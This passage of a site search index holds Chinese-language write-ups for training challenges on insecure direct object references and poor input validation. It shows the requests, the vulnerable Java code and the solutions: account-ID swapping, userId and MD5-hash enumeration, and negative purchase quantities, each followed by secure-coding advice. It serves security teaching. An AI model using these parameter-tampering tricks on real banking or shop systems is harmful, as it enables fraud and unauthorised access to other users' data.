Challenge(\u94f6\u884c\u4e0d\u5b89\u5168\u7684\u76f4\u63a5\u5bf9\u8c61\u5f15\u7528)"},{"location":"vul/Insecure-Direct-Object-Reference-Bank-Challenge.html#_1","text":"\u8fd9\u4e2a\u9898\u9700\u8981\u6ce8\u518c\u4e00\u4e2a\u4e2a\u4eba\u8d26\u6237\uff0c\u5e76\u4e14\u628a\u4e2a\u4eba\u8d26\u6237\u5b58\u6b3e\u589e\u52a0\u5230\u5927\u4e8e5000000","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/Insecure-Direct-Object-Reference-Bank-Challenge.html#_2","text":"\u8fd9\u4e2a\u9898\u6709\u5f88\u591a\u8fc7\u7a0b\uff0c\u6ce8\u518c\u3001\u767b\u5f55\u90fd\u6ca1\u6709\u53d1\u73b0\u5b89\u5168\u95ee\u9898 \u5728\u67e5\u770b\u4e2a\u4eba\u5b58\u6b3e\u529f\u80fd\u65f6 POST /challenges/1f0935baec6ba69d79cfb2eba5fdfa6ac5d77fadee08585eb98b130ec524d00cCurrentBalance HTTP/1.1 accountNumber=2 \u53d1\u73b0\u5f53\u524d\u8d26\u6237id\u662f2\uff0c\u81ea\u7136\u60f3\u5230\u8fd8\u6709\u4e2a\u8d26\u53f7id=1\uff0c\u53d1\u73b0id=1\u91d1\u989d\u6bd4\u8f83\u591a \u5728\u770b\u8f6c\u8d26\u529f\u80fd POST /challenges/1f0935baec6ba69d79cfb2eba5fdfa6ac5d77fadee08585eb98b130ec524d00cTransfer HTTP/1.1 senderAccountNumber=2&recieverAccountNumber=1&transferAmount=500000 \u6821\u9a8c\u4e86\u8f6c\u8d26\u7684\u91d1\u989d\u5fc5\u987b\u5927\u4e8e0 \uff0c\u53d1\u9001\u8005\u4f59\u989d\u5fc5\u987b\u5927\u4e8e\u8f6c\u8d26\u91d1\u989d String senderAccountNumber = request.getParameter(\"senderAccountNumber\"); log.debug(\"Sender Account Number - \" + senderAccountNumber); String recieverAccountNumber = request.getParameter(\"recieverAccountNumber\"); log.debug(\"Reciever Account Number - \" + recieverAccountNumber); String transferAmountString = request.getParameter(\"transferAmount\"); log.debug(\"Transfer Amount - \" + transferAmountString); float tranferAmount = Float.parseFloat(transferAmountString); //Data Validation //Positive Transfer Amount? if(tranferAmount > 0) //\u8f6c\u8d26\u91d1\u989d\u4e3a\u6b63 { //Sender Account Has necessary funds? float senderFunds = DirectObjectBankLogin.getAccountBalance(senderAccountNumber, applicationRoot); if((senderFunds-tranferAmount) > 0) //\u4f59\u989d\u4e0d\u80fd\u4e3a\u8d1f { //Check Receiver Account Exists try { float recieverAccountBalanace = DirectObjectBankLogin.getAccountBalance(recieverAccountNumber, applicationRoot); if(recieverAccountBalanace >= 0) performTransfer = true; } catch(Exception e) { log.debug(\"Reciever Account does not exist. Cancelling\"); errorMessage = bundle.getString(\"transfer.error.recieverNotFound\"); } } else errorMessage = bundle.getString(\"transfer.error.notEnoughCash\"); } else errorMessage = bundle.getString(\"transfer.error.moreThanZero\"); \u95ee\u9898\u662f\u6ca1\u6709\u6821\u9a8c\u8f6c\u8d26\u53d1\u9001\u8005\u548c\u63a5\u6536\u8005\uff0c\u5bfc\u81f4\u4efb\u610f\u6dfb\u52a0\u8f6c\u8d26\u7684\u53d1\u9001\u8005\u548c\u63a5\u6536\u8005","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/Insecure-Direct-Object-Reference-Bank-Challenge.html#_3","text":"\u5c06\u63a5\u6536\u8005recieverAccountNumber \u4fee\u6539\u4e3a\u81ea\u5df1id \u5373\u53ef","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/Insecure-Direct-Object-Reference-Bank-Challenge.html#_4","text":"\u4e0d\u8981\u4fe1\u4efb\u5ba2\u6237\u7aef\u4f20\u9012\u7684\u6570\u636e","title":"\u603b\u7ed3"},{"location":"vul/Insecure-Direct-Object-References-Challenge-One.html","text":"Insecure Direct Object References Challenge One(\u4e0d\u5b89\u5168\u7684\u76f4\u63a5\u5bf9\u8c61\u5f15\u7528 1) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u901a\u5173\u5bc6\u94a5\u4fdd\u5b58\u5728\u4e00\u4e2a\u7528\u6237\u7684\u4e2a\u4eba\u914d\u7f6e\u4e2d\uff0c\u4f46\u8fd9\u4e2a\u7528\u6237\u6ca1\u6709\u5728\u754c\u9762\u4e0a\u5c55\u793a \u529f\u80fd\u5b9e\u73b0 \u00b6 \u70b9\u51fb\u9875\u9762\u6309\u94ae\u67e5\u770b\u8bf7\u6c42 POST /challenges/o9a450a64cc2a196f55878e2bd9a27a72daea0f17017253f87e7ebd98c71c98c HTTP/1.1 userId%5B%5D=3 \u5bf9\u5e94\u540e\u7aef\u5b9e\u73b0\u4ee3\u7801 src/main/java/servlets/module/challenge/DirectObject1.java String userId = request.getParameter(\"userId[]\"); //\u8bfb\u53d6\u53c2\u6570 log.debug(\"User Submitted - \" + userId); String ApplicationRoot = getServletContext().getRealPath(\"\"); log.debug(\"Servlet root = \" + ApplicationRoot ); String htmlOutput = new String(); Connection conn = Database.getChallengeConnection(ApplicationRoot, \"directObjectRefChalOne\"); PreparedStatement prepstmt = conn.prepareStatement(\"SELECT userName, privateMessage FROM users WHERE userId = ?\"); //\u8fdb\u884c\u53c2\u6570\u5316\u67e5\u8be2 \u65e0SQL\u6ce8\u5165 prepstmt.setString(1, userId); ResultSet resultSet = prepstmt.executeQuery(); if(resultSet.next()) //\u8bfb\u53d6\u5230\u4fe1\u606f \u5219\u8fd4\u56de\u5230\u524d\u7aef { log.debug(\"Found user: \" + resultSet.getString(1)); String userName = resultSet.getString(1); String privateMessage = resultSet.getString(2); htmlOutput = \"<h2 class='title'>\" + userName + \"'s \" + bundle.getString(\"response.message\") + \"</h2>\" + \"<p>\" + privateMessage + \"</p>\"; } else \u4ece\u4ee3\u7801\u770b\uff0c\u6ca1\u6709SQL\u6ce8\u5165\u4e86\uff0c\u53ea\u662f\u4e0d\u65ad\u7684\u904d\u5386\u53c2\u6570userId[] \u89e3\u9898\u6b65\u9aa4 \u00b6 \u4eceuserId%5B%5D=1 \u5f00\u59cb\u904d\u5386\uff0c\u76f4\u5230\u83b7\u5f97\u901a\u5173\u5bc6\u94a5\u4e3a\u6b62 \u603b\u7ed3 \u00b6 \u5b8c\u5168\u4f9d\u8d56\u5ba2\u6237\u7aef\u63d0\u4ea4\u7684\u6570\u636e\u8fdb\u884c\u64cd\u4f5c \uff0c\u5728\u65e5\u5e38\u7684\u7cfb\u7edf\u4e2d\u6bd4\u8f83\u5e38\u89c1 \u5b89\u5168\u7684\u5f00\u53d1:\u9700\u8981\u5c06\u6838\u5fc3\u529f\u80fd,\u5982\u6743\u9650\u7ba1\u7406\u76f8\u5173\u529f\u80fd\u7684\u8bb0\u5f55\u4fe1\u606f,\u4fdd\u5b58\u5230session\u4e2d \u6b63\u786e\u6d41\u7a0b \u7528\u6237\u767b\u5f55\u540e\uff0c\u5c06\u7528\u6237\u552f\u4e00\u6807\u8bc6\u5982userid\u6216username\u4fdd\u5b58\u5230session\u4e2d \u5f53\u67e5\u8be2\u7528\u6237\u4fe1\u606f\u65f6\uff0c\u76f4\u63a5\u4ecesession\u4e2d\u8bfb\u53d6 \u5982\u9488\u5bf9userid\u8fd9\u6837\u5b57\u6bb5\uff0c\u53ef\u4ee5\u5c06\u5176\u4fee\u6539\u4e3a\u5b57\u7b26\u4e32\uff0c\u503c\u4e3auuid\uff0c\u8fbe\u5230\u65e0\u6cd5\u88ab\u904d\u5386\u7684\u6548\u679c\uff0c\u4e5f\u662f\u4e00\u79cd\u6709\u6548\u89e3\u51b3\u65b9\u6848 \u6c49\u5316\u8bf4\u660e \u00b6 \u6dfb\u52a0\u6587\u4ef6 /src/main/resources/i18n/challenges/directObject/o9a450a64cc2a196f55878e2bd9a27a72daea0f17017253f87e7ebd98c71c98c_zh.properties","title":"Insecure Direct Object References Challenge One(\u4e0d\u5b89\u5168\u7684\u76f4\u63a5\u5bf9\u8c61\u5f15\u7528 1)"},{"location":"vul/Insecure-Direct-Object-References-Challenge-One.html#insecure-direct-object-references-challenge-one-1","text":"","title":"Insecure Direct Object References Challenge One(\u4e0d\u5b89\u5168\u7684\u76f4\u63a5\u5bf9\u8c61\u5f15\u7528 1)"},{"location":"vul/Insecure-Direct-Object-References-Challenge-One.html#_1","text":"\u901a\u5173\u5bc6\u94a5\u4fdd\u5b58\u5728\u4e00\u4e2a\u7528\u6237\u7684\u4e2a\u4eba\u914d\u7f6e\u4e2d\uff0c\u4f46\u8fd9\u4e2a\u7528\u6237\u6ca1\u6709\u5728\u754c\u9762\u4e0a\u5c55\u793a","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/Insecure-Direct-Object-References-Challenge-One.html#_2","text":"\u70b9\u51fb\u9875\u9762\u6309\u94ae\u67e5\u770b\u8bf7\u6c42 POST /challenges/o9a450a64cc2a196f55878e2bd9a27a72daea0f17017253f87e7ebd98c71c98c HTTP/1.1 userId%5B%5D=3 \u5bf9\u5e94\u540e\u7aef\u5b9e\u73b0\u4ee3\u7801 src/main/java/servlets/module/challenge/DirectObject1.java String userId = request.getParameter(\"userId[]\"); //\u8bfb\u53d6\u53c2\u6570 log.debug(\"User Submitted - \" + userId); String ApplicationRoot = getServletContext().getRealPath(\"\"); log.debug(\"Servlet root = \" + ApplicationRoot ); String htmlOutput = new String(); Connection conn = Database.getChallengeConnection(ApplicationRoot, \"directObjectRefChalOne\"); PreparedStatement prepstmt = conn.prepareStatement(\"SELECT userName, privateMessage FROM users WHERE userId = ?\"); //\u8fdb\u884c\u53c2\u6570\u5316\u67e5\u8be2 \u65e0SQL\u6ce8\u5165 prepstmt.setString(1, userId); ResultSet resultSet = prepstmt.executeQuery(); if(resultSet.next()) //\u8bfb\u53d6\u5230\u4fe1\u606f \u5219\u8fd4\u56de\u5230\u524d\u7aef { log.debug(\"Found user: \" + resultSet.getString(1)); String userName = resultSet.getString(1); String privateMessage = resultSet.getString(2); htmlOutput = \"<h2 class='title'>\" + userName + \"'s \" + bundle.getString(\"response.message\") + \"</h2>\" + \"<p>\" + privateMessage + \"</p>\"; } else \u4ece\u4ee3\u7801\u770b\uff0c\u6ca1\u6709SQL\u6ce8\u5165\u4e86\uff0c\u53ea\u662f\u4e0d\u65ad\u7684\u904d\u5386\u53c2\u6570userId[]","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/Insecure-Direct-Object-References-Challenge-One.html#_3","text":"\u4eceuserId%5B%5D=1 \u5f00\u59cb\u904d\u5386\uff0c\u76f4\u5230\u83b7\u5f97\u901a\u5173\u5bc6\u94a5\u4e3a\u6b62","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/Insecure-Direct-Object-References-Challenge-One.html#_4","text":"\u5b8c\u5168\u4f9d\u8d56\u5ba2\u6237\u7aef\u63d0\u4ea4\u7684\u6570\u636e\u8fdb\u884c\u64cd\u4f5c \uff0c\u5728\u65e5\u5e38\u7684\u7cfb\u7edf\u4e2d\u6bd4\u8f83\u5e38\u89c1 \u5b89\u5168\u7684\u5f00\u53d1:\u9700\u8981\u5c06\u6838\u5fc3\u529f\u80fd,\u5982\u6743\u9650\u7ba1\u7406\u76f8\u5173\u529f\u80fd\u7684\u8bb0\u5f55\u4fe1\u606f,\u4fdd\u5b58\u5230session\u4e2d \u6b63\u786e\u6d41\u7a0b \u7528\u6237\u767b\u5f55\u540e\uff0c\u5c06\u7528\u6237\u552f\u4e00\u6807\u8bc6\u5982userid\u6216username\u4fdd\u5b58\u5230session\u4e2d \u5f53\u67e5\u8be2\u7528\u6237\u4fe1\u606f\u65f6\uff0c\u76f4\u63a5\u4ecesession\u4e2d\u8bfb\u53d6 \u5982\u9488\u5bf9userid\u8fd9\u6837\u5b57\u6bb5\uff0c\u53ef\u4ee5\u5c06\u5176\u4fee\u6539\u4e3a\u5b57\u7b26\u4e32\uff0c\u503c\u4e3auuid\uff0c\u8fbe\u5230\u65e0\u6cd5\u88ab\u904d\u5386\u7684\u6548\u679c\uff0c\u4e5f\u662f\u4e00\u79cd\u6709\u6548\u89e3\u51b3\u65b9\u6848","title":"\u603b\u7ed3"},{"location":"vul/Insecure-Direct-Object-References-Challenge-One.html#_5","text":"\u6dfb\u52a0\u6587\u4ef6 /src/main/resources/i18n/challenges/directObject/o9a450a64cc2a196f55878e2bd9a27a72daea0f17017253f87e7ebd98c71c98c_zh.properties","title":"\u6c49\u5316\u8bf4\u660e"},{"location":"vul/Insecure-Direct-Object-References-Challenge-Two.html","text":"Insecure Direct Object References Challenge Two(\u4e0d\u5b89\u5168\u7684\u76f4\u63a5\u5bf9\u8c61\u5f15\u7528 2) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u9700\u8981\u904d\u5386\u4e00\u4e2a\u4e0d\u5728\u5217\u8868\u4e2d\u7684\u7528\u6237\uff0c\u83b7\u5f97\u901a\u5173\u5bc6\u94a5 \u529f\u80fd\u5b9e\u73b0 \u00b6 \u83b7\u5f97\u5230\u7684\u8bf7\u6c42\u6570\u636e\u5305 POST /challenges/vc9b78627df2c032ceaf7375df1d847e47ed7abac2a4ce4cb6086646e0f313a4 HTTP/1.1 userId%5B%5D=eccbc87e4b5ce2fe28308fd9f2a7baf3 \u5bf9\u5e94\u5b9e\u73b0\u4ee3\u7801\u6bd4\u8f83\u7b80\u5355 String userId = request.getParameter(\"userId[]\"); log.debug(\"User Submitted - \" + userId); String ApplicationRoot = getServletContext().getRealPath(\"\"); log.debug(\"Servlet root = \" + ApplicationRoot ); String htmlOutput = new String(); Connection conn = Database.getChallengeConnection(ApplicationRoot, \"directObjectRefChalTwo\"); PreparedStatement prepstmt = conn.prepareStatement(\"SELECT userName, privateMessage FROM users WHERE userId = ?\"); prepstmt.setString(1, userId); ResultSet resultSet = prepstmt.executeQuery(); if(resultSet.next()) { log.debug(\"Found user: \" + resultSet.getString(1)); String userName = resultSet.getString(1); String privateMessage = resultSet.getString(2); htmlOutput = \"<h2 class='title'>\" + userName + \"'s \" + bundle.getString(\"response.message\") + \"</h2>\" + \"<p>\" + privateMessage + \"</p>\"; } \u76f4\u63a5\u67e5\u8be2\u5e93\uff0c\u6ca1\u6709\u4efb\u4f55\u5176\u4ed6\u64cd\u4f5c\uff0c\u63d0\u4ea4\u7684\u6570\u636e eccbc87e4b5ce2fe28308fd9f2a7baf3 \u4e00\u770b\u50cfmd5,\u4f7f\u7528cmd5\u89e3\u5bc6\u540e\u662f3 \uff0c\u5e76\u4e14\u5c06\u6240\u6709\u663e\u793a\u7684\u7528\u6237id\u8fdb\u884c\u89e3\u5bc6\uff0c\u83b7\u5f97\u7684\u503c\u662f 2,3,5,7,11 \u6309\u7167\u9898\u63d0\u793a\uff0c\u975e\u4e0a\u8ff0\u7528\u6237\u5217\u8868\uff0c\u6240\u4ee5\u76f4\u63a5\u904d\u5386 1,4,6,8,9,10,12,13...\u5373\u53ef \u89e3\u9898\u6b65\u9aa4 \u00b6 \u5c06\u6570\u5b571,4,6,8,9,10,12,13...\u4f7f\u7528md5\u52a0\u5bc6\u540e\uff0c\u8fdb\u884c\u91cd\u653e\u5373\u53ef \u603b\u7ed3 \u00b6 md5\u5b58\u5728\u649e\u5e93\u7684\u95ee\u9898\uff0c\u5982\u679c\u8981\u4f7f\u7528\u5efa\u8bae\u6dfb\u52a0hash\u503c","title":"Insecure Direct Object References Challenge Two(\u4e0d\u5b89\u5168\u7684\u76f4\u63a5\u5bf9\u8c61\u5f15\u7528 2)"},{"location":"vul/Insecure-Direct-Object-References-Challenge-Two.html#insecure-direct-object-references-challenge-two-2","text":"","title":"Insecure Direct Object References Challenge Two(\u4e0d\u5b89\u5168\u7684\u76f4\u63a5\u5bf9\u8c61\u5f15\u7528 2)"},{"location":"vul/Insecure-Direct-Object-References-Challenge-Two.html#_1","text":"\u9700\u8981\u904d\u5386\u4e00\u4e2a\u4e0d\u5728\u5217\u8868\u4e2d\u7684\u7528\u6237\uff0c\u83b7\u5f97\u901a\u5173\u5bc6\u94a5","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/Insecure-Direct-Object-References-Challenge-Two.html#_2","text":"\u83b7\u5f97\u5230\u7684\u8bf7\u6c42\u6570\u636e\u5305 POST /challenges/vc9b78627df2c032ceaf7375df1d847e47ed7abac2a4ce4cb6086646e0f313a4 HTTP/1.1 userId%5B%5D=eccbc87e4b5ce2fe28308fd9f2a7baf3 \u5bf9\u5e94\u5b9e\u73b0\u4ee3\u7801\u6bd4\u8f83\u7b80\u5355 String userId = request.getParameter(\"userId[]\"); log.debug(\"User Submitted - \" + userId); String ApplicationRoot = getServletContext().getRealPath(\"\"); log.debug(\"Servlet root = \" + ApplicationRoot ); String htmlOutput = new String(); Connection conn = Database.getChallengeConnection(ApplicationRoot, \"directObjectRefChalTwo\"); PreparedStatement prepstmt = conn.prepareStatement(\"SELECT userName, privateMessage FROM users WHERE userId = ?\"); prepstmt.setString(1, userId); ResultSet resultSet = prepstmt.executeQuery(); if(resultSet.next()) { log.debug(\"Found user: \" + resultSet.getString(1)); String userName = resultSet.getString(1); String privateMessage = resultSet.getString(2); htmlOutput = \"<h2 class='title'>\" + userName + \"'s \" + bundle.getString(\"response.message\") + \"</h2>\" + \"<p>\" + privateMessage + \"</p>\"; } \u76f4\u63a5\u67e5\u8be2\u5e93\uff0c\u6ca1\u6709\u4efb\u4f55\u5176\u4ed6\u64cd\u4f5c\uff0c\u63d0\u4ea4\u7684\u6570\u636e eccbc87e4b5ce2fe28308fd9f2a7baf3 \u4e00\u770b\u50cfmd5,\u4f7f\u7528cmd5\u89e3\u5bc6\u540e\u662f3 \uff0c\u5e76\u4e14\u5c06\u6240\u6709\u663e\u793a\u7684\u7528\u6237id\u8fdb\u884c\u89e3\u5bc6\uff0c\u83b7\u5f97\u7684\u503c\u662f 2,3,5,7,11 \u6309\u7167\u9898\u63d0\u793a\uff0c\u975e\u4e0a\u8ff0\u7528\u6237\u5217\u8868\uff0c\u6240\u4ee5\u76f4\u63a5\u904d\u5386 1,4,6,8,9,10,12,13...\u5373\u53ef","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/Insecure-Direct-Object-References-Challenge-Two.html#_3","text":"\u5c06\u6570\u5b571,4,6,8,9,10,12,13...\u4f7f\u7528md5\u52a0\u5bc6\u540e\uff0c\u8fdb\u884c\u91cd\u653e\u5373\u53ef","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/Insecure-Direct-Object-References-Challenge-Two.html#_4","text":"md5\u5b58\u5728\u649e\u5e93\u7684\u95ee\u9898\uff0c\u5982\u679c\u8981\u4f7f\u7528\u5efa\u8bae\u6dfb\u52a0hash\u503c","title":"\u603b\u7ed3"},{"location":"vul/Poor-Validation-One.html","text":"Poor Validation One(\u5931\u6548\u7684\u6570\u636e\u8ba4\u8bc1 1) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u9700\u8981\u5b9e\u73b0\u7a7a\u624b\u5957\u767d\u72fc\uff0c\u4e0d\u82b1\u94b1\u8d2d\u4e70\u5230\u7b2c\u4e09\u4e2a\u5546\u54c1(\u5de8\u9b54) \u529f\u80fd\u5b9e\u73b0 \u00b6 \u70b9\u51fb\u9875\u9762\u8d2d\u4e70\u6309\u94ae \uff0c\u83b7\u5f97\u8bf7\u6c42\u5305 POST /challenges/ca0e89caf3c50dbf9239a0b3c6f6c17869b2a1e2edc3aa6f029fd30925d66c7e HTTP/1.1 megustaAmount=0&trollAmount=1&rageAmount=-100&notBadAmount=0 \u5bf9\u5e94\u540e\u7aef\u5b9e\u73b0\u4ee3\u7801 src/main/java/servlets/module/challenge/PoorValidation1.java int megustaAmount = Integer.parseInt(request.getParameter(\"megustaAmount\")); //\u6240\u6709\u8f93\u5165\u8fdb\u884c\u4e86\u5f3a\u5236\u8f6c\u6362\u6210int \u4f46\u6ca1\u6709\u6821\u9a8c\u662f\u5426\u662f\u6b63\u6570 int trollAmount = Integer.parseInt(request.getParameter(\"trollAmount\")); //\u8d2d\u4e70\u5de8\u9b54\u7684\u5546\u54c1\u7684\u6570\u91cf int rageAmount = Integer.parseInt(request.getParameter(\"rageAmount\")); int notBadAmount = Integer.parseInt(request.getParameter(\"notBadAmount\")); //Working out costs int megustaCost = megustaAmount * 30; int trollCost = trollAmount * 3000; int rageCost = rageAmount * 45; int notBadCost = notBadAmount * 15; htmlOutput = new String(); //Work Out Final Cost int finalCost = megustaCost + rageCost + notBadCost + trollCost; //\u8ba1\u7b97\u6700\u7ec8\u7684\u8d39\u7528 //Output Order htmlOutput = \"<h3 class='title'>\" + bundle.getString(\"poorValidation.orderComplete\")+ \"</h3>\" + \"<p>\" + bundle.getString(\"poorValidation.orderComplete.message\")+ \"<br></p>\" + \"<p>\" + bundle.getString(\"poorValidation.orderTotal\")+ \" <a><strong>$\" + finalCost + \"</strong></a></p>\"; if (finalCost <= 0 && trollAmount > 0) //\u6700\u7ec8\u8d39\u7528\u5c0f\u4e8e\u7b49\u4e8e0, \u5e76\u4e14\u5de8\u9b54\u7684\u8d39\u7528\u5927\u4e8e1 \u5219\u8868\u793a\u901a\u5173 { htmlOutput += \"<br><p>\" + bundle.getString(\"poorValidation.freeTrolls\")+ \" - \" + Hash.generateUserSolution(levelSolution, currentUser) + \"</p>\"; } \u89e3\u9898\u6b65\u9aa4 \u00b6 \u8d2d\u4e70\u7684\u6570\u91cf\u6ca1\u6709\u6821\u9a8c\u662f\u5426\u662f\u8d1f\u6570,\u56e0\u6b64\u53ea\u9700\u8981\u4fdd\u8bc1\u5de8\u9b54\u5546\u54c1\u4e3a\u6b63\u6570\uff0c\u5176\u4ed6\u5546\u54c1\u6570\u91cf\u4e3a\u8d1f\u6570\uff0c\u603b\u4ef7\u683c\u5c0f\u4e8e0\u5373\u53ef \u603b\u7ed3 \u00b6 \u5bf9\u7528\u6237\u6536\u5165\u7684\u6570\u636e\u8fdb\u884c\u6821\u9a8c\u662f\u975e\u5e38\u91cd\u8981\u7684\uff0c\u672c\u9898\u5df2\u7ecf\u8fdb\u884c\u4e86\u90e8\u5206\u6821\u9a8c\uff0c\u4f46\u7531\u4e8e\u6821\u9a8c\u4e0d\u5145\u5206\uff0c\u6ca1\u6709\u8003\u8651\u5230\u8d1f\u6570\u60c5\u51b5\uff0c\u8fdb\u800c\u9020\u6210\u6f0f\u6d1e \u6821\u9a8c\u4e00\u5b9a\u8981\u5145\u5206\uff0c\u786e\u4fdd\u8f93\u5165\u6570\u636e\uff0c\u5728\u7cfb\u7edf\u53ef\u7528\u60c5\u51b5\u4e0b\u7684\u6700\u5c0f\u96c6\u5408 \u6c49\u5316\u8bf4\u660e \u00b6 \u6dfb\u52a0\u6c49\u5316\u6587\u4ef6 src/main/resources/i18n/challenges/poorValidation/poorValidationStrings_zh.properties","title":"Poor Validation One(\u5931\u6548\u7684\u6570\u636e\u8ba4\u8bc1 1)"},{"location":"vul/Poor-Validation-One.html#poor-validation-one-1","text":"","title":"Poor Validation One(\u5931\u6548\u7684\u6570\u636e\u8ba4\u8bc1 1)"},{"location":"vul/Poor-Validation-One.html#_1","text":"\u9700\u8981\u5b9e\u73b0\u7a7a\u624b\u5957\u767d\u72fc\uff0c\u4e0d\u82b1\u94b1\u8d2d\u4e70\u5230\u7b2c\u4e09\u4e2a\u5546\u54c1(\u5de8\u9b54)","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/Poor-Validation-One.html#_2","text":"\u70b9\u51fb\u9875\u9762\u8d2d\u4e70\u6309\u94ae \uff0c\u83b7\u5f97\u8bf7\u6c42\u5305 POST /challenges/ca0e89caf3c50dbf9239a0b3c6f6c17869b2a1e2edc3aa6f029fd30925d66c7e HTTP/1.1 megustaAmount=0&trollAmount=1&rageAmount=-100&notBadAmount=0 \u5bf9\u5e94\u540e\u7aef\u5b9e\u73b0\u4ee3\u7801 src/main/java/servlets/module/challenge/PoorValidation1.java int megustaAmount = Integer.parseInt(request.getParameter(\"megustaAmount\")); //\u6240\u6709\u8f93\u5165\u8fdb\u884c\u4e86\u5f3a\u5236\u8f6c\u6362\u6210int \u4f46\u6ca1\u6709\u6821\u9a8c\u662f\u5426\u662f\u6b63\u6570 int trollAmount = Integer.parseInt(request.getParameter(\"trollAmount\")); //\u8d2d\u4e70\u5de8\u9b54\u7684\u5546\u54c1\u7684\u6570\u91cf int rageAmount = Integer.parseInt(request.getParameter(\"rageAmount\")); int notBadAmount = Integer.parseInt(request.getParameter(\"notBadAmount\")); //Working out costs int megustaCost = megustaAmount * 30; int trollCost = trollAmount * 3000; int rageCost = rageAmount * 45; int notBadCost = notBadAmount * 15; htmlOutput = new String(); //Work Out Final Cost int finalCost = megustaCost + rageCost + notBadCost + trollCost; //\u8ba1\u7b97\u6700\u7ec8\u7684\u8d39\u7528 //Output Order htmlOutput = \"<h3 class='title'>\" + bundle.getString(\"poorValidation.orderComplete\")+ \"</h3>\" + \"<p>\" + bundle.getString(\"poorValidation.orderComplete.message\")+ \"<br></p>\" + \"<p>\" + bundle.getString(\"poorValidation.orderTotal\")+ \" <a><strong>$\" + finalCost + \"</strong></a></p>\"; if (finalCost <= 0 && trollAmount > 0) //\u6700\u7ec8\u8d39\u7528\u5c0f\u4e8e\u7b49\u4e8e0, \u5e76\u4e14\u5de8\u9b54\u7684\u8d39\u7528\u5927\u4e8e1 \u5219\u8868\u793a\u901a\u5173 { htmlOutput += \"<br><p>\" + bundle.getString(\"poorValidation.freeTrolls\")+ \" - \" + Hash.generateUserSolution(levelSolution, currentUser) + \"</p>\"; }","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/Poor-Validation-One.html#_3","text":"\u8d2d\u4e70\u7684\u6570\u91cf\u6ca1\u6709\u6821\u9a8c\u662f\u5426\u662f\u8d1f\u6570,\u56e0\u6b64\u53ea\u9700\u8981\u4fdd\u8bc1\u5de8\u9b54\u5546\u54c1\u4e3a\u6b63\u6570\uff0c\u5176\u4ed6\u5546\u54c1\u6570\u91cf\u4e3a\u8d1f\u6570\uff0c\u603b\u4ef7\u683c\u5c0f\u4e8e0\u5373\u53ef","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/Poor-Validation-One.html#_4","text":"\u5bf9\u7528\u6237\u6536\u5165\u7684\u6570\u636e\u8fdb\u884c\u6821\u9a8c\u662f\u975e\u5e38\u91cd\u8981\u7684\uff0c\u672c\u9898\u5df2\u7ecf\u8fdb\u884c\u4e86\u90e8\u5206\u6821\u9a8c\uff0c\u4f46\u7531\u4e8e\u6821\u9a8c\u4e0d\u5145\u5206\uff0c\u6ca1\u6709\u8003\u8651\u5230\u8d1f\u6570\u60c5\u51b5\uff0c\u8fdb\u800c\u9020\u6210\u6f0f\u6d1e \u6821\u9a8c\u4e00\u5b9a\u8981\u5145\u5206\uff0c\u786e\u4fdd\u8f93\u5165\u6570\u636e\uff0c\u5728\u7cfb\u7edf\u53ef\u7528\u60c5\u51b5\u4e0b\u7684\u6700\u5c0f\u96c6\u5408","title":"\u603b\u7ed3"},{"location":"vul/Poor-Validation-One.html#_5","text":"\u6dfb\u52a0\u6c49\u5316\u6587\u4ef6 src/main/resources/i18n/challenges/poorValidation/poorValidationStrings_zh.properties","title":"\u6c49\u5316\u8bf4\u660e"},{"location":"vul/Poor-Validation-Two.html","text":"Poor Validation Two(\u5931\u6548\u7684\u6570\u636e\u9a8c\u8bc1 2) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u9700\u8981\u4e0d\u82b1\u94b1\u8d2d\u4e70\u5230\u7b2c\u4e09\u65b9\u5546\u54c1 \u529f\u80fd\u5b9e\u73b0 \u00b6 \u8bf7\u6c42\u6570\u636e\u5305 POST /challenges/20e8c4bb50180fed9c1c8d1bf6af5eac154e97d3ce97e43257c76e73e3bbe5d5 HTTP/1.1 megustaAmount=0&trollAmount=1&rageAmount=-100&notBadAmount=0 \u5bf9\u5e94\u5b9e\u73b0\u4ee3\u7801 int megustaAmount = validateAmount(Integer.parseInt(request.getParameter(\"megustaAmount\"))); //\u5f3a\u5236\u8f6c\u4e49 \u4e3a\u5927\u4e8e0 log.debug(\"megustaAmount - \" + megustaAmount); int trollAmount = validateAmount(Integer.parseInt(request.getParameter(\"trollAmount\"))); //\u5f3a\u5236\u8f6c\u4e49 \u4e3a\u5927\u4e8e0 log.debug(\"trollAmount - \" + trollAmount); int rageAmount = validateAmount(Integer.parseInt(request.getParameter(\"rageAmount\"))); //\u5f3a\u5236\u8f6c\u4e49 \u4e3a\u5927\u4e8e0 log.debug(\"rageAmount - \" + rageAmount); int notBadAmount = validateAmount(Integer.parseInt(request.getParameter(\"notBadAmount\"))); //\u5f3a\u5236\u8f6c\u4e49 \u4e3a\u5927\u4e8e0 log.debug(\"notBadAmount - \" + notBadAmount); //Working out costs int megustaCost = megustaAmount * 30; int trollCost = trollAmount * 3000; int rageCost = rageAmount * 45; int notBadCost = notBadAmount * 15; htmlOutput = new String(); //Work Out Final Cost int finalCost = megustaCost + rageCost + notBadCost + trollCost; //Output Order htmlOutput = \"<h3 class='title'>\" + bundle.getString(\"poorValidation.orderComplete\") + \"</h3>\" + \"<p>\" + bundle.getString(\"poorValidation.orderComplete.message\") + \"</p><br/>\" + \"<p>\" + bundle.getString(\"poorValidation.orderTotal\") + \" <a><strong>$\" + finalCost + \"</strong></a></p>\"; if (finalCost <= 0 && trollAmount > 0) //\u603b\u91d1\u989d\u5c0f\u4e8e\u7b49\u4e8e0\uff0c\u5de8\u9b54\u6570\u91cf\u5927\u4e8e0 { htmlOutput += \"<br><p>\" + bundle.getString(\"poorValidation.freeTrolls\") + \" - \" + Hash.generateUserSolution(levelSolution, currentUser) + \"</p>\"; } //\u9a8c\u8bc1\u4e86 